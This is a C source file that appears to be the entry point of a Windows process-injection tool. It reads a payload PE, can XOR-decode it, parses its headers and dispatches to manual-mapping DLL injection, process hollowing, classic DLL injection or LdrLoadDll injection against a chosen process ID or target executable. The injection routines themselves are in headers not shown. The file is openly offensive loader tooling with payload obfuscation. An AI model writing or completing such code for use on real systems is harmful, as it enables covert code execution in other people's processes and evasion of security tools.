#include "Header Files/macros.h"
#include "Header Files/structs.h"
#include "Header Files/techniques.h"


peinfos ReadPe(char* path)
{
	peinfos infos;
	FILE* fp = fopen(path, "rb");
	if (fp == NULL) {
		error("Failed to open Pe");
	}

	fseek(fp, 0, SEEK_END);
	size_t size = ftell(fp);
	fseek(fp, 0, SEEK_SET);

	BYTE* pe = (BYTE*)malloc(size);
	if (!fread(pe, 1, size, fp)) {
		error("Failed to read PE into memory");
	}
	//--------------------------------------------------------

	infos.pe = pe;
	infos.size = size;

	fclose(fp);
	return infos;
}

peinfos PEParser(peinfos infos)
{

	infos.dosHeader = (PIMAGE_DOS_HEADER)infos.pe;
	if (infos.dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		error("Invalid DOS header");
	}

	infos.ntHeader = (PIMAGE_NT_HEADERS64)(infos.pe + infos.dosHeader->e_lfanew);
	if (infos.ntHeader->Signature != IMAGE_NT_SIGNATURE) {
		error("Invalid NT header");
	}

	if (infos.ntHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
		error("Not a 64-bit PE file");
	}

	infos.sectionHeader = IMAGE_FIRST_SECTION(infos.ntHeader);
	okay("Current PID (%d)", GetCurrentProcessId());
	okay("Local Image Base Address (0x%p)", infos.pe);
	return infos;
}

int Peinjector_main(int argc, char* argv[])
{

	DWORD PID = -1;
	DWORD TID = -1;
	char* path = NULL;
	char* target = NULL;
	int algorithm = -1;
	int technique = -1;
	int count = 0;


	for (int i = 0; i < argc; i++)
	{
		if (strcmp(argv[i], "-pid") == 0 && i + 1 < argc)
		{
			PID = atoi(argv[++i]);

		}
		if (strcmp(argv[i], "-tid") == 0 && i + 1 < argc)
		{
			TID = atoi(argv[++i]);
		}
		if (strcmp(argv[i], "-sc") == 0 && i + 1 < argc)
		{
			path = argv[++i];
		}
		if (strcmp(argv[i], "-t") == 0 && i + 1 < argc)
		{
			technique = atoi(argv[++i]);
		}
		if (strcmp(argv[i], "-v") == 0 && i + 1 < argc)
		{
			target = argv[++i];
		}
		if (strcmp(argv[i], "-d") == 0 && i + 1 < argc)
		{
			algorithm = atoi(argv[++i]);
		}
	}
	if (PID == 0)
	{
		PID = GetCurrentProcessId();
	}
	peinfos infos = ReadPe(path);

	if (algorithm != -1)
	{
		switch (algorithm)
		{
		case XOR:
			XOR_dec(infos.pe, infos.size);
			break;

		}
	}
	infos = PEParser(infos);
	switch (technique)
	{

		case MANUAL_MAPPING_DLL_INJECTION:
		if (path == NULL || PID == NULL)
		{
			error("Invalid Syntax | Run With --help for help menu");
			
		}
		ManualMappingDllInjection(infos, PID);
		break;

		case PROCESS_HOLLOWING:
		if (path == NULL || target == NULL)
		{
			error("Invalid Syntax | Run With --help for help menu");

		}
		ProcessHollowing(infos, target);
		break;
		case NORMAL_DLL_INJECTION:
			if (path == NULL || PID == -1 )
			{
				error("Invalid Syntax | Run With --help for help menu");

			}
			NormalDllInjection(path, PID);
			break;
		case LDR_LOADDLL_INJECTION:
			if (path == NULL || PID == -1)
			{
				error("Invalid Syntax | Run With --help for help menu");

			}
			LdrLoadDll_Injection(path, PID);
			break;




		default:
		error("Invalid Technique id refer to the help menu for available techniques");
		break;
	}


}